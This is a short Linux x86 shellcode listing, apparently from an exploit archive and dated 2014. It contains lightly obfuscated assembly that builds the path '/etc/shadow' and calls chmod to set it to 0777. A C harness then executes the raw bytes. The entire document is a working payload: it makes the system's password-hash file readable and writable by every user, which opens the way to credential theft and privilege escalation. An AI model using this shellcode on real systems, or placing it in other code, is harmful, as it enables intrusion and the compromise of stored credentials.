/*
; Title:    chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes
; Platform: linux/x86
; Date:     2014-06-22
; Author:   Osanda Malith Jayathissa (@OsandaMalith)

section .text
global _start

_start:
mov ebx, eax
xor eax, ebx
push dword eax
mov esi, 0x563a1f3e
add esi, 0x21354523
mov dword [esp-4], esi
mov dword [esp-8], 0x68732f2f
mov dword [esp-12], 0x6374652f
sub esp, 12
mov    ebx,esp
push word  0x1ff
pop    cx
mov    al,0xf
int    0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
main() {

       printf("Shellcode Length:  %d\n", strlen(code));
       int (*ret)() = (int(*)())code;
       ret();

return 0;
}